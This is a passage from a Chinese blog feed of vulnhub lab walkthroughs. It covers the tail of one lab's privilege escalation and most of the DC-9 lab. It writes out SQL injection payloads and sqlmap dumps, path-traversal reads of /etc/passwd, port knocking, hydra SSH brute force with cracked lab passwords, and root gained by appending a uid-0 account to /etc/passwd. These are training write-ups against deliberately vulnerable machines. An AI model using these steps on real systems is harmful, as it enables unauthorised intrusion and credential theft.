number">192.168</span>.52.152   （本机IP地址）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220404471.png" alt="image-20240110220404471"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220430380.png" alt="image-20240110220430380"></p><p>我们进行攻击</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220654257.png" alt="image-20240110220654257"></p><p>攻击成功</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><h4 id="1-使用python切换至交互式shell"><a href="#1-使用python切换至交互式shell" class="headerlink" title="1)使用python切换至交互式shell"></a>1)使用python切换至交互式shell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shellpython <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220732262.png" alt="image-20240110220732262"></p><p>我们进行搜集信息，一般情况下我们查看&#x2F;var&#x2F;www&#x2F;html&#x2F;路径文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162441485.png" alt="image-20240113162441485"></p><p>我们查看两个文件，一个是robots.txt，一个是reports，但是都没有用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162720372.png" alt="image-20240113162720372"></p><p>我们查看隐藏文件，在reports目录中，发现了 .htaccess 隐藏文件，隐藏文件一般都会有提示信息，查看一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162824178.png" alt="image-20240113162824178"></p><p>是一个提示文件，提示我们&#x2F;var&#x2F;www&#x2F;.htpasswd</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162951000.png" alt="image-20240113162951000"></p><p><strong>是一个用户的账户密码，提示密码10位数且只有</strong>aefhrt**这些字符，那我们可以使用crunch生成密码字典</p><h4 id="2-crunch生成密码"><a href="#2-crunch生成密码" class="headerlink" title="2)crunch生成密码"></a>2)crunch生成密码</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113163218040.png" alt="image-20240113163218040"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">10</span> <span class="token number">10</span> aefhrt <span class="token parameter variable">-o</span> /home/kali/桌面/MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113163902653.png" alt="image-20240113163902653"></p><p>成功在指定路径生成了密码字典文件，接下来再把<strong>douglas</strong>用户的密码保存到另外一个文件中，文件路径为：&#x2F;root&#x2F;user.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113164111098.png" alt="image-20240113164111098"></p><h4 id="3-john爆破密码"><a href="#3-john爆破密码" class="headerlink" title="3)john爆破密码"></a>3)john爆破密码</h4><p>使用john爆破用户名密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/home/kali/桌面/MS02423.txt  /home/kali/桌面/user.txt   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破的时候突然卡住了，我把<strong>douglas</strong>用户的密码保存在了桌面上，爆破速度有点慢</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113170245868.png" alt="image-20240113170245868"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113170435451.png" alt="image-20240113170435451"></p><p>爆破得到密码：fatherrrrr</p><h4 id="4-ssh公匙免密登录jen用户"><a href="#4-ssh公匙免密登录jen用户" class="headerlink" title="4)ssh公匙免密登录jen用户"></a>4)ssh公匙免密登录jen用户</h4><p>首先我们切换到douglas用户名，我们查看权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113170825632.png" alt="image-20240113170825632"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171120070.png" alt="image-20240113171120070"></p><p>发现可以使用cp命令使用<strong>jen</strong>用户权限免密执行，同时在<strong>douglas</strong>根目录下，看到隐藏文件**.ssh**</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171358887.png" alt="image-20240113171358887"></p><p>进入.ssh目录，发现是ssh公钥</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171438974.png" alt="image-20240113171438974"></p><p>在里面发现了id_rsa和id_rsa.pub两个文件，那么把它cp到jen目录下就可以使用ssh公匙免密登录jen了<br>将公钥复制到jen里：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> id_rsa.pub /tmp/authorized_keys<span class="token function">chmod</span> <span class="token number">777</span> /tmp/authorized_keys<span class="token function">sudo</span> <span class="token parameter variable">-u</span> jen /bin/cp /tmp/authorized_keys /home/jen/.ssh<span class="token function">ssh</span> jen@192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到登录成功，而且有一封邮件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171926477.png" alt="image-20240113171926477"></p><h4 id="5-获取信息，得到moss用户密码"><a href="#5-获取信息，得到moss用户密码" class="headerlink" title="5)获取信息，得到moss用户密码"></a>5)获取信息，得到moss用户密码</h4><p>我们查看邮件,进入**&#x2F;var&#x2F;mail**邮箱路径进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113172351157.png" alt="image-20240113172351157"></p><p>我们登录moss用户，我们查看权限</p><p>很可惜。moss用户无法以root权限执行任何命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113172558198.png" alt="image-20240113172558198"></p><p>我们查看隐藏文件，看到有一个.games</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113172952469.png" alt="image-20240113172952469"></p><p>我们进行访问，看到有一个文件是root用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173047269.png" alt="image-20240113173047269"></p><p>我们进行访问，访问后发现一个root权限的二进制文件upyourgame，我们进行执行文件就获取到了root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173159899.png" alt="image-20240113173159899"></p><h4 id="6-提权到root，查看flag"><a href="#6-提权到root，查看flag" class="headerlink" title="6)提权到root，查看flag"></a>6)提权到root，查看flag</h4><p>我们执行.&#x2F;upyourgame文件，然后一直输入yes即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173300213.png" alt="image-20240113173300213"></p><p>我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173315261.png" alt="image-20240113173315261"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.msfconsole工具的使用</p><p>10.crunsh和john工具的使用</p><p>11.ssh公钥</p><p>12.opennetadmin漏洞利用</p><p>13.邮箱路径&#x2F;var&#x2F;mail</p><p>14.MiniServ服务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-9</title>
    <link href="http://ms02423.top/2024/01/09/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-9/"/>
    <id>http://ms02423.top/2024/01/09/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-9/</id>
    <published>2024-01-09T06:49:10.000Z</published>
    <updated>2024-01-09T14:33:53.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-9 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-9<span class="token punctuation">,</span><span class="token number">412</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150106054.png" alt="image-20240109150106054"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150139977.png" alt="image-20240109150139977"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150619965.png" alt="image-20240109150619965"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150719519.png" alt="image-20240109150719519"></p><p>靶场的真实ip地址是192.168.52.131</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.131</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109151001815.png" alt="image-20240109151001815"></p><p> 注意到ssh服务端口是filtered的，可能是因为什么原因关闭了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109151534928.png" alt="image-20240109151534928"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.38</span><span class="token punctuation">(</span><span class="token punctuation">(</span>debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109151721992.png" alt="image-20240109151721992"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">whatweb -v <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.131</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109152351370.png" alt="image-20240109152351370"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.131</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109152800589.png" alt="image-20240109152800589"></p><p>没有如何有用的信息</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153022173.png" alt="image-20240109153022173"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153211906.png" alt="image-20240109153211906"></p><p>上面两个都没有扫描到有用的信息</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.131 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153525872.png" alt="image-20240109153525872"></p><p>我们可以看到扫描到2个有用的信息，一个&#x2F;inex.php&#x2F;login,一个&#x2F;manage.php</p><p>我们分别访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153727723.png" alt="image-20240109153727723"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153741635.png" alt="image-20240109153741635"></p><p>我们可以看到是一个登录页面，看来需要我们进行登录，但是不知道用户名和密码，我们对页面进行探测</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-页面探测"><a href="#1-页面探测" class="headerlink" title="1)页面探测"></a>1)页面探测</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109155037059.png" alt="image-20240109155037059"></p><p>我们可以看到4个页面，我们一一进行探测，最后发现search存在POST型SQL注入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109155648721.png" alt="image-20240109155648721"></p><h4 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2)SQL注入"></a>2)SQL注入</h4><p>我们进行测试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">search<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109160220516.png" alt="image-20240109160220516"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">search<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109160154425.png" alt="image-20240109160154425"></p><p>证明存在SQL注入，我们使用sqlmap进行爆破</p><p>爆破数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1'</span>sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109164603256.png" alt="image-20240109164603256"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109164639922.png" alt="image-20240109164639922"></p><p>我们看到存在3个数据库，我们爆破 Staff</p><p>爆破表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'Staff' --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165121805.png" alt="image-20240109165121805"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109164955448.png" alt="image-20240109164955448">爆破字段名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'Staff' -T 'Users' --columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165142093.png" alt="image-20240109165142093"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165200750.png" alt="image-20240109165200750"></p><p>爆破用户名和密码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'Staff' -T 'Users' -C 'UserID,Username,Password' --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165352353.png" alt="image-20240109165352353"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165414955.png" alt="image-20240109165414955"></p><p>我们可以看到只有一个用户名和密码，密码是md5加密的，我们进行解密即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109170603479.png" alt="image-20240109170603479"></p><p>密码是transorbital1</p><h4 id="3-登录后台"><a href="#3-登录后台" class="headerlink" title="3)登录后台"></a>3)登录后台</h4><p>我们接着用该密码登入后台</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109170740474.png" alt="image-20240109170740474"></p><p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p><p>burpsuite抓包，构建payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?§§<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109204619893.png" alt="image-20240109204619893"></p><p>然后再把我们的参数字典加载进来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109201834786.png" alt="image-20240109201834786"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109203037986.png" alt="image-20240109203037986"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109204228910.png" alt="image-20240109204228910"></p><p>参数名是file，存在目录遍历漏洞</p><h4 id="4-端口敲门服务"><a href="#4-端口敲门服务" class="headerlink" title="4)端口敲门服务"></a>4)端口敲门服务</h4><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p><p>构造payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/manage.php?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/knockd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109204350312.png" alt="image-20240109204350312"></p><p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-z</span> <span class="token number">192.168</span>.52.131 <span class="token number">7469</span> <span class="token number">8475</span> <span class="token number">9842</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109205447903.png" alt="image-20240109205447903"></p><p>敲击完后发现端口打开了</p><h4 id="5-ssh爆破"><a href="#5-ssh爆破" class="headerlink" title="5)ssh爆破"></a>5)ssh爆破</h4><p>我们使用ssh进行登录，发现登录不了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109205934820.png" alt="image-20240109205934820"></p><p>想起之前SQLmap跑出过一个users的数据库， 存放网站用户信息的，我们去瞧一下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'users' -dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109210151740.png" alt="image-20240109210151740"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109210218085.png" alt="image-20240109210218085"></p><p>用这些账号密码组成字典，爆破ssh</p><p>username.txt</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">marym juliedfredfbarneyrtomcjerrymwilmafbettyrchandlerbjoeytrachelgrossgmonicagphoebebscootsjanitorjanitor2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>password.txt</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">3kfs86sfd468sfdfsd24sfd87sfd1RocksOffTC<span class="token operator">&amp;</span>TheBoyzB8m#48sdPebblesBamBam01UrAG0D!Passw0rdyN72#dsdILoveRachel3248dsds7ssmellycatsYR3BVxxxw87IlovepeepeeHawaii-Five-0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来用九头蛇进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> username.txt <span class="token parameter variable">-P</span> password.txt ssh://192.168.52.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109210739070.png" alt="image-20240109210739070"></p><p>爆破出来3个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">chandlerb<span class="token punctuation">:</span>UrAG0D!joeyt<span class="token punctuation">:</span>Passw0rdjanitor<span class="token punctuation">:</span>Ilovepeepee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尝试登入发现janitor用户有东西</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211236603.png" alt="image-20240109211236603"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211115878.png" alt="image-20240109211115878"></p><p>有几个密码，复制到刚才的password文件继续爆破ssh</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211616657.png" alt="image-20240109211616657"></p><p>新添加了一个用户</p><p>我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211756620.png" alt="image-20240109211756620"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109212239263.png" alt="image-20240109212239263"></p><p>发现有个root权限文件</p><h4 id="6-提权"><a href="#6-提权" class="headerlink" title="6) 提权"></a>6) 提权</h4><p>发现这里有个脚本文件可以无密码以root用户权限执行，我们进入&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test目录下先看看有什么信息，全是文件，回到上一个目录查看，也没什么，再回到上一个目录查看，在&#x2F;opt&#x2F;devstuff目录下发现了一个test.py脚本文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109212533285.png" alt="image-20240109212533285"></p><p>我们查看文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109212613285.png" alt="image-20240109212613285"></p><p>这是一个写入文件的脚本，生成一个密码用root权限执行脚本写入&#x2F;etc&#x2F;passwd文件，所以我们现在就需要构造一个拥有root权限的用户，并且在&#x2F;etc&#x2F;passwd文件中储存，只要使用这个用户登录后，就可以获取到root权限，事先参考<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">&#x2F;etc&#x2F;passwd解释</a></p><p>先利用openssl命令创建一个密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> <span class="token operator">&lt;</span>用户名<span class="token operator">></span> <span class="token operator">&lt;</span>密码<span class="token operator">></span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> MS02423 MS02423<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109220355343.png" alt="image-20240109220355343"></p><p>得到hash密码，</p><pre class="line-numbers language-haskell" data-language="haskell"><code class="language-haskell"><span class="token operator">$</span><span class="token number">1</span><span class="token operator">$</span><span class="token constant">MS02423</span><span class="token operator">$</span><span class="token hvariable">xCJ3D9eufDuODS1PBNjp51</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们切换到tmp目录下，新建一个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">'MS02423:$1$MS02423$xCJ3D9eufDuODS1PBNjp51:0:0::/root:/bin/bash'</span> <span class="token operator">></span> MS02423<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109220506874.png" alt="image-20240109220506874"></p><p>再回到&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test目录，执行程序test，将MS02423的文件内容写入到&#x2F;etc&#x2F;passwd文件里面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/devstuff/dist/test <span class="token function">sudo</span> ./test /tmp/MS02423 /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109214004115.png" alt="image-20240109214004115"></p><p>可以看到MS02423用户已经添加到&#x2F;etc&#x2F;passwd文件里了，接下来然后使用命令su MS02423 切换到我们添加的MS02423用户，输入之前设置好密码即可登录</p><p>跳转到&#x2F;root目录下，成功看到flag</p><p><img 